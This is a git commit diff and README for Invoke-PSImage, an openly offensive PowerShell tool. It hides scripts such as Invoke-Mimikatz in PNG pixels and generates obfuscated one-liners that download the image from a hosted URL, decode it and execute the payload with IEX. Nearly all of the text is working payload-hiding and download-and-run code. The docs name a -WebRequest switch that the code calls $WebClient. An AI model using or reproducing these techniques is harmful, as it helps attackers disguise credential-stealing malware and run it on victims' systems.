b7a4e401140494f5f22be375e52cd40aae4764e1
Barrett Adams <barrett.adams@gmail.com>
2019-09-23 11:16:52 -0400

    v2
    New download method with Windows.Forms.PictureBox,
    Added ability to create image with only payload data.

--- Invoke-PSImage.ps1
+++ Invoke-PSImage.ps1
@@ -8,34 +8,40 @@ Author:  Barrett Adams (@peewpw)
 
 .DESCRIPTION
 
-Embeds a PowerShell script in an image by editing the least significant 4 bits of
-2 color values (2 of RGB) in each pixel (for as many pixels as are needed for the payload).
-Image quality will suffer as a result, but it still looks decent. The image is saved as a
-PNG, and can be losslessly compressed without affecting the ability to execute the payload
-as the data is stored in the colors themselves. It can accept most image types as input, but
-output will always be a PNG because it needs to be lossless.
+This tool can either create an image with just the target data, or can embed the payload in
+an existing image. When embeding, the least significant 4 bits of 2 color values (2 of RGB) in
+each pixel (for as many pixels as are needed for the payload). Image quality will suffer as
+a result, but it still looks decent. The image is saved as a PNG, and can be losslessly
+compressed without affecting the ability to execute the payload as the data is stored in the
+colors themselves. It can accept most image types as input, but output will always be a PNG
+because it needs to be lossless.
 
 .PARAMETER Script
 
 The path to the script to embed in the Image.
 
-.PARAMETER Image
-
-The image to embed the script in.
-
 .PARAMETER Out
 
 The file to save the resulting image to (image will be a PNG)
 
-.PARAMETER Web
+.PARAMETER Image
 
-Output a command for reading the image from the web instead of reading from a file.
+The image to embed the script in. (optional)
+
+.PARAMETER WebRequest
+
+Output a command for reading the image from the web using Net.WebClient.
+You will need to host the image and insert the URL into the command.
+
+.PARAMETER PictureBox
+
+Output a command for reading the image from the web using System.Windows.Forms.PictureBox.
 You will need to host the image and insert the URL into the command.
 
 .EXAMPLE
 
 PS>Import-Module .\Invoke-PSImage.ps1
-PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png
+PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg 
    [Oneliner to execute from a file]
    
 #>
@@ -47,13 +53,15 @@ PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-ki
     
         [Parameter(Position = 1, Mandatory = $True)]
         [String]
-        $Image,
-    
-        [Parameter(Position = 2, Mandatory = $True)]
-        [String]
         $Out,
+    
+        [Parameter(Position = 2, Mandatory = $False)]
+        [String]
+        $Image,
 
-        [switch] $Web
+        [switch] $WebClient,
+        
+        [switch] $PictureBox
     )
     # Stop if we hit an error instead of making more errors
     $ErrorActionPreference = "Stop"
@@ -64,86 +72,138 @@ PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-ki
     
     # Normalize paths beacuse powershell is sometimes bad with them.
     if (-Not [System.IO.Path]::IsPathRooted($Script)){
-        $Script = [System.IO.Path]::GetFullPath((Join-Path (pwd) $Script))
-    }
-    if (-Not [System.IO.Path]::IsPathRooted($Image)){
-        $Image = [System.IO.Path]::GetFullPath((Join-Path (pwd) $Image))
+        $Script = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Script))
     }
     if (-Not [System.IO.Path]::IsPathRooted($Out)){
-        $Out = [System.IO.Path]::GetFullPath((Join-Path (pwd) $Out))
+        $Out = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Out))
     }
-        
+
+    $testurl = "http://example.com/" + [System.IO.Path]::GetFileName($Out)
+
     # Read in the script
     $ScriptBlockString = [IO.File]::ReadAllText($Script)
-    $input = [ScriptBlock]::Create($ScriptBlockString)
-    $payload = [system.Text.Encoding]::ASCII.GetBytes($input)
+    $in = [ScriptBlock]::Create($ScriptBlockString)
+    $payload = [system.Text.Encoding]::ASCII.GetBytes($in)
 
-    # Read the image into a bitmap
-    $img = New-Object System.Drawing.Bitmap($Image)
-
-    $width = $img.Size.Width
-    $height = $img.Size.Height
-
-    # Lock the bitmap in memory so it can be changed programmatically.
-    $rect = New-Object System.Drawing.Rectangle(0, 0, $width, $height);
-    $bmpData = $img.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::ReadWrite, $img.PixelFormat)
-    $ptr = $bmpData.Scan0
-
-    # Copy the RGB values to an array for easy modification
-    $bytes  = [Math]::Abs($bmpData.Stride) * $img.Height
-    $rgbValues = New-Object byte[] $bytes;
-    [System.Runtime.InteropServices.Marshal]::Copy($ptr, $rgbValues, 0, $bytes);
-
-    # Check that the payload fits in the image 
-    if($bytes/2 -lt $payload.Length) {
-        Write-Error "Image not large enough to contain payload!"
-        $img.UnlockBits($bmpData)
-        $img.Dispose()
-        Break
-    }
-
-    # Generate a random string to use to fill other pixel info in the picture.
-    # (Calling get-random everytime is too slow)
-    $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
-    $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)
-    
-    # loop through the RGB array and copy the payload into it
-    for ($counter = 0; $counter -lt ($rgbValues.Length)/3; $counter++) {
-        if ($counter -lt $payload.Length){
-            $paybyte1 = [math]::Floor($payload[$counter]/16)
-            $paybyte2 = ($payload[$counter] -band 0x0f)
-            $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
-        } else {
-            $paybyte1 = ($randb[$counter%113] -band 0x0f)
-            $paybyte2 = ($randb[($counter+1)%67] -band 0x0f)
-            $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
+    if ($Image) {
+        # Normalize paths beacuse powershell is sometimes bad with them.
+        if (-Not [System.IO.Path]::IsPathRooted($Image)){
+            $Image = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Image))
         }
-        $rgbValues[($counter*3)] = ($rgbValues[($counter*3)] -band 0xf0) -bor $paybyte1
-        $rgbValues[($counter*3+1)] = ($rgbValues[($counter*3+1)] -band 0xf0) -bor $paybyte2
-        $rgbValues[($counter*3+2)] = ($rgbValues[($counter*3+2)] -band 0xf0) -bor $paybyte3
+        
+        # Read the image into a bitmap
+        $img = New-Object System.Drawing.Bitmap($Image)
+
+        $width = $img.Size.Width
+        $height = $img.Size.Height
+
+        # Lock the bitmap in memory so it can be changed programmatically.
+        $rect = New-Object System.Drawing.Rectangle(0, 0, $width, $height);
+        $bmpData = $img.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::ReadWrite, $img.PixelFormat)
+        $ptr = $bmpData.Scan0
+
+        # Copy the RGB values to an array for easy modification
+        $bytes  = [Math]::Abs($bmpData.Stride) * $img.Height
+        $rgbValues = New-Object byte[] $bytes;
+        [System.Runtime.InteropServices.Marshal]::Copy($ptr, $rgbValues, 0, $bytes);
+
+        # Check that the payload fits in the image 
+        if($bytes/2 -lt $payload.Length) {
+            Write-Error "Image not large enough to contain payload!"
+            $img.UnlockBits($bmpData)
+            $img.Dispose()
+            Break
+        }
+
+        # Generate a random string to use to fill other pixel info in the picture.
+        # (Calling get-random everytime is too slow)
+        $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
+        $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)
+        
+        # loop through the RGB array and copy the payload into it
+        for ($counter = 0; $counter -lt ($rgbValues.Length)/3; $counter++) {
+            if ($counter -lt $payload.Length){
+                $paybyte1 = [math]::Floor($payload[$counter]/16)
+                $paybyte2 = ($payload[$counter] -band 0x0f)
+                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
+            } else {
+                $paybyte1 = ($randb[$counter%113] -band 0x0f)
+                $paybyte2 = ($randb[($counter+1)%67] -band 0x0f)
+                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
+            }
+            $rgbValues[($counter*3)] = ($rgbValues[($counter*3)] -band 0xf0) -bor $paybyte1
+            $rgbValues[($counter*3+1)] = ($rgbValues[($counter*3+1)] -band 0xf0) -bor $paybyte2
+            $rgbValues[($counter*3+2)] = ($rgbValues[($counter*3+2)] -band 0xf0) -bor $paybyte3
+        }
+
+        # Copy the array of RGB values back to the bitmap
+        [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $bytes)
+        $img.UnlockBits($bmpData)
+
+        # Write the image to a file
+        $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
+        $img.Dispose()
+        
+        # Get a bunch of numbers we need to use in the oneliner
+        $rows = [math]::Ceiling($payload.Length/$width)
+        $array = ($rows*$width)
+        $lrows = ($rows-1)
+        $lwidth = ($width-1)
+        $lpayload = ($payload.Length-1)
+
+        if($WebClient) {
+            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
+        } elseif($PictureBox) {
+            $pscmd = "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
+        } else {
+            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G-band15))}};`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
+        }
+
+        return $pscmd
+
+    } else {
+        # Decide how large our image needs to be (always square for easy math)
+        $side = ([int] ([math]::ceiling([math]::Sqrt([math]::ceiling($payload.Length / 3)) + 3) / 4)) * 4
+
+        # Decide how large our image needs to be (always square for easy math)
+        $rgbValues = New-Object byte[] ($side * $side * 3);
+        $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
+        $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)
+
+        # loop through the RGB array and copy the payload into it
+        for ($counter = 0; $counter -lt ($rgbValues.Length); $counter++) {
+            if ($counter -lt $payload.Length){
+                $rgbValues[$counter] = $payload[$counter]
+            } else {
+                $rgbValues[$counter] = $randb[$counter%113]
+            }
+        }
+
+        # Copy the array of RGB values back to the bitmap
+        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($rgbValues.Length)
+        [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $rgbValues.Length)
+        $img = New-Object System.Drawing.Bitmap($side, $side, ($side*3), [System.Drawing.Imaging.PixelFormat]::Format24bppRgb, $ptr)
+
+        # Write the image to a file
+        $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
+        $img.Dispose()
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr);
+        
+        # Get a bunch of numbers we need to use in the oneliner
+        $array = ($side*$side)*3
+        $lrows = ($side-1)
+        $lwidth = ($side-1)
+        $width = ($side)
+        $lpayload = ($payload.Length-1)
+
+        if($WebClient) {
+            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
+        } elseif($PictureBox) {
+            $pscmd = "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
+        } else {
+            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
+        }
+
+        return $pscmd
     }
-
-    # Copy the array of RGB values back to the bitmap
-    [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $bytes)
-    $img.UnlockBits($bmpData)
-
-    # Write the image to a file
-    $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
-    $img.Dispose()
-    
-    # Get a bunch of numbers we need to use in the oneliner
-    $rows = [math]::Ceiling($payload.Length/$width)
-    $array = ($rows*$width)
-    $lrows = ($rows-1)
-    $lwidth = ($width-1)
-    $lpayload = ($payload.Length-1)
-
-    if($web) {
-        $pscmd = "sal a New-Object;Add-Type -AssemblyName `"System.Drawing`";`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"http://example.com/evil.png`"));`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
-    }
-    else {
-        $pscmd = "sal a New-Object;Add-Type -AssemblyName `"System.Drawing`";`$g=a System.Drawing.Bitmap(`"$Out`");`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G-band15))}};`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
-    }
-
-    return $pscmd
 }
--- README.md
+++ README.md
@@ -1,38 +1,42 @@
 # Invoke-PSImage
-Embeds a PowerShell script in the pixels of a PNG file and generates a oneliner to execute
+Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute
 
-Invoke-PSImage takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web (when the -Web flag is passed).
+Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.
 
-The least significant 4 bits of 2 color values in each pixel are used to hold the payload. Image quality will suffer as a result, but it still looks decent. The image is saved as a PNG, and can be losslessly compressed without affecting the ability to execute the payload as the data is stored in the colors themselves. It can accept most image types as input, but output will always be a PNG because it needs to be lossless.
+It can either create a new image using only the payload data, or it can embed the payload in the least significant bytes of an existing image so that it looks like an actual picture. The image is saved as a PNG, and can be losslessly compressed without affecting the ability to execute the payload as the data is stored in the colors themselves. When creating new images, normal PowerShell scripts are actually significantly compressed, usually producing a png with a filesize ~50% of the original script.
 
-Each pixel of the image is used to hold one byte of script, so you will need an image with at least as many pixels as bytes in your script. This is fairly easy—for example, Invoke-Mimikatz fits into a 1920x1200 image.
+With the embed method, the least significant 4 bits of 2 color values in each pixel are used to hold the payload. Image quality will suffer as a result, but it still looks decent. It can accept most image types as input, but output will always be a PNG because it needs to be lossless. Each pixel of the image is used to hold one byte of script, so you will need an image with at least as many pixels as bytes in your script. This is fairly easy—for example, Invoke-Mimikatz fits into a 1920x1200 image.
 
 ## Arguments
 
 **-Script** [filepath]
 The path to the script to embed in the Image.
 
-**-Image** [filepath]
-The image to embed the script in.
-
 **-Out** [filepath]
 The file to save the resulting image to (image will be a PNG)
 
-**-Web**
-Output a command for reading the image from the web instead of reading from a file.
+**-Image** [filepath]
+The image to embed the script in. (optional)
+
+**-WebRequest**
+Output a command for reading the image from the web using Net.WebClient.
+You will need to host the image and insert the URL into the command.
+
+**-PictureBox**
+Output a command for reading the image from the web using System.Windows.Forms.PictureBox.
 You will need to host the image and insert the URL into the command.
 
 ## Example
 Create an image with the script "Invoke-Mimikatz.ps1" embeded in it and output a oneliner to execute from disk:
 ```
 PS>Import-Module .\Invoke-PSImage.ps1
-PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png
+PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg
    [Oneliner to execute from a file]
 ``` 
 Create an image with the script "Invoke-Mimikatz.ps1" embeded in it and output a oneliner to execute from the web (you still have to host the image and edit the URL):
 ```
 PS>Import-Module .\Invoke-PSImage.ps1
-PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png -Web
+PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest
    [Oneliner to execute from the web]
 ``` 
 Executing an image hosted on the web:
